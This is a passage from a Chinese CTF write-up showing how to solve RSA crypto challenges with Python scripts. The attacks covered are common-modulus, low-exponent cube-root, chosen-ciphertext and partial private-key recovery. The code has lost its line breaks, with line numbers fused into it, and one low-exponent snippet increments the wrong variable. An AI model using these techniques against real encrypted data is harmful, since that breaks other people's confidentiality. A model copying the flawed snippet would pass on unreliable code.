= gmpy2.invert(c2,N)res = (pow(c1, s1, N) * pow(c2,s2,N)) % Nprint(number.long_to_bytes(res))#flag&#123;we_do_ctf_together_for_fun&#125; xgm(Jarvisoj)下载下来有一个txt文件 1234567n1=21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061e1=65537c1=11623242520063564721509699039034210329314238234068836130756457335142671659158578379060500554276831657322012285562047706736377103534543565179660863796496071187533860896148153856845638989384429658963134915230898572173720454271369543435708994457280819363318783413033774014447450648051500214508699056865320506104733203716242071136228269326451412159760818676814129428252523248822316633339393821052614033884661649376604245744651142959498917235138077366818109892738298251161767344501687113868331134288984466294415889635863660753717476594011236542159800099371872396181448655448842148998667568104710807411358117939831241620315n2=21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061e2=70001c2=8180690717251057689732022736872836938270075717486355807317876695012318283159440935866297644561407238807004565510263413544530421072353735781284166685919420305808123063907272925594909852212249704923889776430284878600408776341129645414000647100303326242514023325498519509077311907161849407990649396330146146728447312754091670139159346316264091798623764434932753276554781692238428057951593104821823029665203821775755835076337570281155689527215367647821372680421305939449511621244288104229290161484649056505784641486376741409443450331991557221540050574024894427139331416236263783977068315294198184169154352536388685040531 一个简单的共模攻击 1234567891011121314151617181920212223242526#coding=utf-8#owner:IFpop#time:2019/10/28import gmpy2from Crypto.Util import numberN = 21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061c1=11623242520063564721509699039034210329314238234068836130756457335142671659158578379060500554276831657322012285562047706736377103534543565179660863796496071187533860896148153856845638989384429658963134915230898572173720454271369543435708994457280819363318783413033774014447450648051500214508699056865320506104733203716242071136228269326451412159760818676814129428252523248822316633339393821052614033884661649376604245744651142959498917235138077366818109892738298251161767344501687113868331134288984466294415889635863660753717476594011236542159800099371872396181448655448842148998667568104710807411358117939831241620315c2=8180690717251057689732022736872836938270075717486355807317876695012318283159440935866297644561407238807004565510263413544530421072353735781284166685919420305808123063907272925594909852212249704923889776430284878600408776341129645414000647100303326242514023325498519509077311907161849407990649396330146146728447312754091670139159346316264091798623764434932753276554781692238428057951593104821823029665203821775755835076337570281155689527215367647821372680421305939449511621244288104229290161484649056505784641486376741409443450331991557221540050574024894427139331416236263783977068315294198184169154352536388685040531e1=65537e2=70001_, s1, s2 = gmpy2.gcdext(e1, e2)if(s1 &lt; 0): s1 = -s1 c1 = gmpy2.invert(c1,N)if(s2 &lt; 0): s2 = -s2 c2 = gmpy2.invert(c2,N)res = (pow(c1, s1, N) * pow(c2,s2,N)) % Nprint(number.long_to_bytes(res))#flag&#123;gongmogongji&#125; 低加密指数攻击基本理论 选择小的e可以缩短加密时间，但是选择的e不当，可能会造成严重的安全问题。在CTF题型中，这种攻击一般适用于e=3, 明文过小，导致明文的三次方还是小于n 123#此时只需要对密文开三次方即可import gmpy2gmpy2.iroot(c,e) 如果m稍微大一点，那么 m^e = k*N + c 我们可以对k进行枚举 1234567import gmpy2k = 0while 1: if(gmpy2.iroot(c+k*n,3)[1] == 1): print(gmpy2.iroot(c+k*n,3)) break i = i+1 题目积累Extremely hard RSA(jarvisoj)解压后发现两个文件，一个密文文件，一个公钥文件，同样使用openssl命令查看公钥信息 12345678root@DESKTOP-OORTB87:/mnt/c/Users/X1TABLET/Desktop/RSA/extremelyhardRSA# openssl rsa -in pubkey.pem -pubin -text -modulus RSA Public-Key: (4096 bit) Modulus: 00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18:fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98: de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56: 56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0: d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c: 97:73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05:68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef: 80:01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49: 10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79:c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70: eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18: 83:af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f: ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24: 13:11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6: ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0: 45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8: c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56: f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08:d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7: fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a: 97:94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d: ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9: 2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a: 1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b: 98:03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77: 0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3: 0b:39:29 Exponent: 3 (0x3) Modulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM= -----END PUBLIC KEY----- 下面直接写脚本解密: ps:gmpy中求根号是gmpy.root gmpy2中求根号是gmpy2.iroot 123456789101112131415161718192021#coding=utf-8import gmpy2from Crypto.Util import numberwith open('flag.enc','rb') as f: c = number.bytes_to_long(f.read()) print(c)n = int('0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929',16)print(n)k = 0while 1: if(gmpy2.iroot(c+k*n,3)[1] == 1): m = gmpy2.iroot(c+k*n,3) print(m[0]) print(number.long_to_bytes(m[0])) break k = k + 1#PCTF&#123;Sm4ll_3xpon3nt_i5_W3ak&#125;#可能需要的时间有点长#看网上的wp，发现k&gt;118000000#可将k = 118000000加快速度 xbk(Jarvisoj)123n=47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659e=3c=10968126341413081941567552025256642365567988931403833266852196599058668508079150528128483441934584299102782386592369069626088211004467782012298322278772376088171342152839 解密脚本: 123456789101112131415161718#coding=utf-8#owner:IFpop#time:2019/10/28import gmpy2from Crypto.Util import numberc = 10968126341413081941567552025256642365567988931403833266852196599058668508079150528128483441934584299102782386592369069626088211004467782012298322278772376088171342152839n = 47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659k = 0while 1: if(gmpy2.iroot(c+k*n,3)[1] == 1): m = gmpy2.iroot(c+k*n,3) print(m[0]) print(number.long_to_bytes(m[0])) break k = k + 1#flag&#123;let_me_do_sth_good&#125; 选择密文攻击题目记录打开链接看到三个选项，很明显可以使用选择密文攻击 首先要让其r &lt; n，r = 2，加密值如下,记为x, : 然后读出flag的密文值,记为c, ： 将flag的密文与m的密文相乘，然后模n,得到­y, ,又因为chice2是有解密的，所以将y解密得到下面一行,记为u, 由RSA原理可知 m = u//r#这里的//代表整除 大致脚本如下 12345#coding:utf-8from Crypto.Util import numberdata = 0xd2e6d8c2c4f6a4a682bed26abeec6ae4f2becac2f4f4f4f4f2fa//2 #整除m = number.long_to_bytes(data)print(m) 得到flag: islab{RSA_i5_v5ry_eazzzzy} 私钥恢复和最优非对称加密填充基本理论 私钥重构 题目积累GOD LIKE RSA(jarvisoj)解压之后，有三个文件，一个公钥文件，一个密文文件，一个损坏的私钥文件 查看公钥信息： 1RSA Public-Key: (4096 bit) Modulus: 00:c0:97:78:53:45:64:84:7d:8c:c4:b4:20:e9:33: 58:67:ec:78:3e:6c:f5:f0:5c:a0:3e:ee:dc:25:63: d0:eb:2a:9e:ba:8f:19:52:a2:67:0b:e7:6e:b2:34: b8:6d:50:76:e0:6a:d1:03:cf:77:33:d8:b1:e9:d7: 3b:e5:eb:1c:65:0c:25:96:fd:96:20:b9:7a:de:1d: bf:fd:f2:b6:bf:81:3e:3e:47:44:43:98:bf:65:2f: 67:7e:27:75:f9:56:47:ba:c4:f0:4e:67:2b:da:e0: 1a:77:14:40:29:c1:a8:67:5a:8f:f5:2e:be:8e:82: 31:3d:43:26:d4:97:86:29:15:14:a9:69:36:2c:76: ed:b5:90:eb:ec:6f:ce:d5:ca:24:1c:aa:f6:63:f8: 06:a2:62:cb:26:74:d3:5b:82:4b:b6:d5:e0:49:32: 7b:62:f8:05:c4:f7:0e:86:59:9b:f3:17:25:02:aa: 3c:97:78:84:7b:16:fd:1a:f5:67:cf:03:17:97:d0: c6:69:85:f0:8d:fa:ce:ee:68:24:63:06:24:e1:e4: 4c:f8:e9:ad:25:c7:e0:c0:15:bb:b4:67:48:90:03: 9b:20:7f:0c:17:eb:9d:13:44:ab:ab:08:a5:c3:dc: c1:98:88:c5:ce:4f:5a:87:9b:0b:bf:bd:d7:0e:a9: 09:59:81:fa:88:4f:59:60:6b:84:84:ad:d9:c7:25: 8c:e8:c0:e8:f7:26:9e:37:95:7c:e1:48:29:0f:51: e7:bd:98:2f:f6:cc:80:e7:f0:32:0b:89:51:92:4e: c2:6d:50:53:2b:3b:77:72:d1:bd:1a:1f:92:d7:12: 79:61:61:c5:a4:7e:b3:85:eb:f0:7c:6d:46:03:c5: e6:d5:81:2c:ba:7e:ea:8d:51:7d:63:55:34:2a:b6: d4:dc:31:5a:f1:99:e3:dc:8c:83:0b:a2:2a:d5:3c: 41:48:41:54:1a:a9:e8:b6:70:bf:d3:fe:ed:19:17: 14:94:13:b3:17:e3:8b:8e:6f:53:ed:e2:44:e8:4a: 32:d6:5c:0d:a8:80:f5:fc:02:e9:46:55:d5:a4:d3: e7:c6:30:77:f9:73:e9:44:52:d8:13:9d:5d:bf:9e: fa:3a:b5:96:79:82:5b:cd:19:5c:06:a9:00:96:fd: 4c:a4:73:88:1a:ec:3c:11:de:b9:3d:e0:50:00:1e: ac:21:97:a1:96:7d:6b:15:f9:6c:c9:34:7f:70:d7: 9d:2d:d1:48:4a:81:71:f8:12:dd:32:ba:64:31:60: 08:26:4b:09:22:03:83:90:17:7f:f3:a7:72:57:bf: 89:6d:e4:d7:40:24:8b:7b:bd:df:33:c0:ff:30:2e: e8:6c:1d Exponent: 65537 (0x10001) Modulus=C09778534564847D8CC4B420E9335867EC783E6CF5F05CA03EEEDC2563D0EB2A9EBA8F1952A2670BE76EB234B86D5076E06AD103CF7733D8B1E9D73BE5EB1C650C2596FD9620B97ADE1DBFFDF2B6BF813E3E47444398BF652F677E2775F95647BAC4F04E672BDAE01A77144029C1A8675A8FF52EBE8E82313D4326D49786291514A969362C76EDB590EBEC6FCED5CA241CAAF663F806A262CB2674D35B824BB6D5E049327B62F805C4F70E86599BF3172502AA3C9778847B16FD1AF567CF031797D0C66985F08DFACEEE6824630624E1E44CF8E9AD25C7E0C015BBB4674890039B207F0C17EB9D1344ABAB08A5C3DCC19888C5CE4F5A879B0BBFBDD70EA9095981FA884F59606B8484ADD9C7258CE8C0E8F7269E37957CE148290F51E7BD982FF6CC80E7F0320B8951924EC26D50532B3B7772D1BD1A1F92D712796161C5A47EB385EBF07C6D4603C5E6D5812CBA7EEA8D517D6355342AB6D4DC315AF199E3DC8C830BA22AD53C414841541AA9E8B670BFD3FEED1917149413B317E38B8E6F53EDE244E84A32D65C0DA880F5FC02E94655D5A4D3E7C63077F973E94452D8139D5DBF9EFA3AB59679825BCD195C06A90096FD4CA473881AEC3C11DEB93DE050001EAC2197A1967D6B15F96CC9347F70D79D2DD1484A8171F812DD32BA64316008264B0922038390177FF3A77257BF896DE4D740248B7BBDDF33C0FF302EE86C1D writing RSA key -----BEGIN PUBLIC KEY----- MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAwJd4U0VkhH2MxLQg6TNY Z+x4Pmz18FygPu7cJWPQ6yqeuo8ZUqJnC+dusjS4bVB24GrRA893M9ix6dc75esc ZQwllv2WILl63h2//fK2v4E+PkdEQ5i/ZS9nfid1+VZHusTwTmcr2uAadxRAKcGo Z1qP9S6+joIxPUMm1JeGKRUUqWk2LHbttZDr7G/O1cokHKr2Y/gGomLLJnTTW4JL ttXgSTJ7YvgFxPcOhlmb8xclAqo8l3iEexb9GvVnzwMXl9DGaYXwjfrO7mgkYwYk 4eRM+OmtJcfgwBW7tGdIkAObIH8MF+udE0Srqwilw9zBmIjFzk9ah5sLv73XDqkJ WYH6iE9ZYGuEhK3ZxyWM6MDo9yaeN5V84UgpD1HnvZgv9syA5/AyC4lRkk7CbVBT Kzt3ctG9Gh+S1xJ5YWHFpH6zhevwfG1GA8Xm1YEsun7qjVF9Y1U0KrbU3DFa8Znj 3IyDC6Iq1TxBSEFUGqnotnC/0/7tGRcUlBOzF+OLjm9T7eJE6Eoy1lwNqID1/ALp RlXVpNPnxjB3+XPpRFLYE51dv576OrWWeYJbzRlcBqkAlv1MpHOIGuw8Ed65PeBQ AB6sIZehln1rFflsyTR/cNedLdFISoFx+BLdMrpkMWAIJksJIgODkBd/86dyV7+J beTXQCSLe73fM8D/MC7obB0CAwEAAQ== -----END PUBLIC KEY----- 模数n有4096bit，分解不太现实，所以目前还是使用损坏的私钥文件，修复脚本(具体也能在基本理论的链接中找到) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279#!/usr/bin/python3import refrom itertools import productfrom Crypto.Util.number import GCD, inversedef solve_linear(a, b, mod): if a &amp; 1 == 0 or b &amp; 1 == 0: return None return (b * inverse(a, mod)) &amp; (mod - 1) # 计算b*a^(-1)%moddef to_n(s): s = re.sub(r"[^0-9a-f]", "", s) return int(s, 16)def msk(s): cleaned = "".join(map(lambda x: x[-2:], s.split(":"))) #去掉冒号和多余字符和空格 return msk_ranges(cleaned), msk_mask(cleaned), msk_val(cleaned)def msk_ranges(s): # 求每一个半字节的取值范围 return [range(16) if c == " " else [int(c, 16)] for c in s] def msk_mask(s): return int("".join("0" if c == " " else "f" for c in s), 16)def msk_val(s): return int("".join("0" if c == " " else c for c in s), 16)N = to_n("""\00:c0:97:78:53:45:64:84:7d:8c:c4:b4:20:e9:33:58:67:ec:78:3e:6c:f5:f0:5c:a0:3e:ee:dc:25:63:d0:eb:2a:9e:ba:8f:19:52:a2:67:0b:e7:6e:b2:34:b8:6d:50:76:e0:6a:d1:03:cf:77:33:d8:b1:e9:d7:3b:e5:eb:1c:65:0c:25:96:fd:96:20:b9:7a:de:1d:bf:fd:f2:b6:bf:81:3e:3e:47:44:43:98:bf:65:2f:67:7e:27:75:f9:56:47:ba:c4:f0:4e:67:2b:da:e0:1a:77:14:40:29:c1:a8:67:5a:8f:f5:2e:be:8e:82:31:3d:43:26:d4:97:86:29:15:14:a9:69:36:2c:76:ed:b5:90:eb:ec:6f:ce:d5:ca:24:1c:aa:f6:63:f8:06:a2:62:cb:26:74:d3:5b:82:4b:b6:d5:e0:49:32:7b:62:f8:05:c4:f7:0e:86:59:9b:f3:17:25:02:aa:3c:97:78:84:7b:16:fd:1a:f5:67:cf:03:17:97:d0:c6:69:85:f0:8d:fa:ce:ee:68:24:63:06:24:e1:e4:4c:f8:e9:ad:25:c7:e0:c0:15:bb:b4:67:48:90:03:9b:20:7f:0c:17:eb:9d:13:44:ab:ab:08:a5:c3:dc:c1:98:88:c5:ce:4f:5a:87:9b:0b:bf:bd:d7:0e:a9:09:59:81:fa:88:4f:59:60:6b:84:84:ad:d9:c7:25:8c:e8:c0:e8:f7:26:9e:37:95:7c:e1:48:29:0f:51:e7:bd:98:2f:f6:cc:80:e7:f0:32:0b:89:51:92:4e:c2:6d:50:53:2b:3b:77:72:d1:bd:1a:1f:92:d7:12:79:61:61:c5:a4:7e:b3:85:eb:f0:7c:6d:46:03:c5:e6:d5:81:2c:ba:7e:ea:8d:51:7d:63:55:34:2a:b6:d4:dc:31:5a:f1:99:e3:dc:8c:83:0b:a2:2a:d5:3c:41:48:41:54:1a:a9:e8:b6:70:bf:d3:fe:ed:19:17:14:94:13:b3:17:e3:8b:8e:6f:53:ed:e2:44:e8:4a:32:d6:5c:0d:a8:80:f5:fc:02:e9:46:55:d5:a4:d3:e7:c6:30:77:f9:73:e9:44:52:d8:13:9d:5d:bf:9e:fa:3a:b5:96:79:82:5b:cd:19:5c:06:a9:00:96:fd:4c:a4:73:88:1a:ec:3c:11:de:b9:3d:e0:50:00:1e:ac:21:97:a1:96:7d:6b:15:f9:6c:c9:34:7f:70:d7:9d:2d:d1:48:4a:81:71:f8:12:dd:32:ba:64:31:60:08:26:4b:09:22:03:83:90:17:7f:f3:a7:72:57:bf:89:6d:e4:d7:40:24:8b:7b:bd:df:33:c0:ff:30:2e:e8:6c:1d""")p_ranges, pmask_msk, pmask_val = msk("""\ 0: e: : : :c :c : : : :b : : : : : :ab: e: 2: 8:c : : : 1:6 :6 : 6: f:d9: 0:8 :5c:7 :06: : : :0 : 3:5 :4b: :6 : : :2 : :6 : : : :2 :bc: c: :85:1 : 1:d : 3: 1:b4: : b: 1: 3: d:a : : :6e: 0:b :2 : : :b : :9 :e : :82:8d: : :13: : : a: a: : :4 : :c : f: : :7 :e :0a: : : b: 5: : e:91:3 : :3c: 9: : 6: : :b5:7d: 1: : : : :b :a1:99:6 :4 :3 :c :1a:02:4 : : 9:9 :f : d:bd: :0 : : : :b3: : 4: :e9: 9: : d: : :7 : :93: : e:dc: : 0: :e7: :e : :2 : b: 2:5 : : : : : c:5f: : :e2: : : 9: :2a: : e: : :2 : :9f: 7:3 : :b : f:b : : 8: 7: : :f :6 :e :c : :3 : :f7: 5: 8: 5: : : : : : 8: e: :03: c: :33:76:e : 1:7 : c: : 0: :0b: : a: : 2: 9: :c8:bf: : :06: 7:d5: :02: c:b :e2: 7:2 : : """)q_ranges, qmask_msk, qmask_val = msk("""\ 0: f: :d0: 1:55: 4:31: : b:c4:8 : : e: d:34: 3:f : : : : : 8:99:1 : : a:0 : :4 :0 : :f : :a4:41:2 : :a : : 1: : a: c: : : : 9: : : 2:f4: f: : : : :1 : 4:9 :a : : :79:0 : : : : : 2: 8:b : :4 : 8: :9b: 1: :d : :f :e4: :4 :c :e : :3 : : 7:2 : :d :8 :2 :7 : :d :67:fc:e : 0:f9: 7:8 : : : :1 :2f: :51: : :2e:0a: e:3d: 6:b : :dd: : 0:fb: :f4: : : :b4: 9:c : : a: : : :d : : :6b: 2: :9b: a:60: :d6: 0:4f:16:d1: : :5 :fc: :f : :8 : : : : 1: 6:e1:9 : e:4 : 6: c: d:d :73: 3: : :7 : :8 : 9: :3b:f : 2: : :f1: e: : :1e: :8 : : : 6:0 : 4:99:e : : 5: : : 4: : : : a:81:64: :7 :f : 9: d: :9 : : 7:93:f :ac:8c: : 8: : 0: d: 8: :7 : :1d: :f : :1 :a :6 :8 : :60: :b3: : : :89: : :14: :5 """)_, dmask_msk, dmask_val = msk("""\ : : : f:8 :a5:d : 2: 0:b :7 : : 1: : 4: 1:0d: :3 : :6 : : : b: : : :e : : :0e: 0:db: :1a:1c:c0: : e: : :99:bc:8 :a5:7 :7 :7 : b: : : 8: 8: :7 :55: 2: : :f :b2: : :b :f :4 : : 8: :b : : : : 0: :0 : :6 :9 : : : : b: 4: : 0: a: 5:07:b : 9: c:9a: 9: : 7:9e: : b:60:f : : : :0 : : 3:0 : : : : 1:b : : : b: 6:0 :f : : : 2:18: 6: b:1 : : : : :d3:f3: :a : : 3: : : : : 3: d: 1: 2:7 : : d: : 2: d: : : d:4 : :d : :6d: c:a :b6: : : : 1:69: : 7: :89: :c :8 :61: d:25: 3:7 :1b: 4:b : :8 :55: :49: 1:2 :3 : :1 :e9:a8: 3: :9 : : 1:f8:d3: :e : :d : :9 :b6: : :71:1 : :c1: : b: 1: : 6:e : :64: : :1a:c : : b: :bf:c : : 0: : 8:a :4 : :26:a :5 :6 : : : :eb: :e5: a: :3e:f9:10:0 : : : 6:0 : : 8: : 1:72: c:0 : f:5 : f:9c: 0: e: 7:b : : : : :d9: 4: : e:c :68: : : : c: :3a: : :a0:ea: 3: 4: :72:a :d : 8: : :0d:5 :0 : a: 7:c :bb: 6: 4:a :ce:d :2 : 1: : :17:6 : : c: b: : f: :3 : 5:6 :3 :0e: : 7:c :3e: 2: 9: 7: 6: f: e: f: 9: :f3: 9:a :c1:6 : : 1:9 : :43: : f: 5: :0 :27: 4:4 :a : :e9: : 8: 4:3 :8a: 6:16:d5:c : e: e: :d : c:b :a8: : 7: : 9: :7 :7d: : : : : : :4 :2 : : 3: 3: 6: : : :7b:0 : : e: :0 : :a : : 5: : : : 5:1 :82:c :0d:4 :2 :fd:36: 5:50:0 : : :d : f: 6: : :e :0 : : :ce: :9e:8 : :0 :d :07:b3: : : :0 :e4: : :68:b :c : : c:5 : : :3 : 7: 2: c:e0: :5 : : :b4: :ef: 7: :1 :e : 0:f : :6 : : : :e0:c :3 : : : 3: : d: : : 3: 3: c: a: :b : a:71: 3: 0:a : :4 :5d: :0 :4 """)_, dpmask_msk, dpmask_val = msk("""\ : 3:2a: : d: : : : :0 :1 : f: : : 6:1 :2 :1b:07: a:e :b :c5:58:7 : :e8: 7: 1: c: : 1:b :a0: 4:0f:5 :67: :3 :7 :6 :f9: : c: :79: 0:1 :65: :8 : :99: d:d : :2 :9 :0 : e: :0 : : : : d: :d :7 :6 :a9: a:8b: b: : : 7: a:37: : :7 :1 :6 : :c2: 7:6 :b : e: : : : : : :b :3a:5 : : : : : : : : :cd:8 : : d: :7 : 3: : f:e : c: : : a: :c : f:c : 7:b :5 : : :2 :8 :8 :6 :0a: a: : :3 :db: : 4:00: : d: :b : 5: :20: 2: 5: :82: : 0: 6: :8a: :7 : : 8: : 4: 1: : : : 8:46: : : : : : 0:f :c8:2 : : c:7 : : 1: : :2 : 0: 5: : : 1:9b: 6:9 : 0:74: :c : :e : : :cb:b :3 :3 : : 2: : :47: :2 : 0:5 : : : d: 6:83: : : :c7: : :0b: : : c: :3 :8 : :9 :4 : 7:5 :c0:fe: :f9: 1: :0 : e: 8:02: : f: :c :55:61""")_, dqmask_msk, dqmask_val = msk("""\ :0b:7 :4 :0 : 0:6 : 7:7e: : 5: : 7: : a:a :d : 0: 6: 4:86: : :8 : : : : :e :8f: 9: : : : 1: :2 : : 7: b:1 :5 : f: :8 : :d :21: :e : d: :c9:e : b: : :1 : : : :d :a2:b7: : : :f3: :42: :e : c: :f : : 0:f :7 : 4: 5:34: :4 : c: : :8 :d : 8:5 :af: 3:1d: 5:4 : :2 : :6 :c : 6:a :1 :5 : a:9 : :d : : :0a:a1: :f :7 :9 :b : : : f:2 :27: f: :0 :f6:4d: : : : : :5 : : 4:08: : 5: : 8: 5: : : :18: 4: 8:57: 2: f: a: : :a8: f: c:f : e: 1:9 :c : 4:9 : : : : : : : 1: :2 : :d1: : 6:e : d: : : f:04:2 :8d: : 3: : :b : 8: :d6: : 2: : : :6 : : f: : : 0:6 : :51: :48:19: : : :69:4 : c: :c : : f: :f4:d : : f: d:0 :0d:b :3 : 3:2 : : :6 : b:5 :2 : : c: 1:5a: f:f : : :7e:3e: :d :f :0 : d: c: 6: 1""")E = 0x10001def search(K, Kp, Kq, check_level, break_step): max_step = 0 cands = [0] # 广搜队列 for step in range(1, break_step + 1): # step代表复原倒数第step步 max_step = max(step, max_step) mod = 1 &lt;&lt; (4 * step) mask = mod - 1 cands_next = [] for p, new_digit in product(cands, p_ranges[-step]): pval = (new_digit &lt;&lt; ((step - 1) * 4)) | p 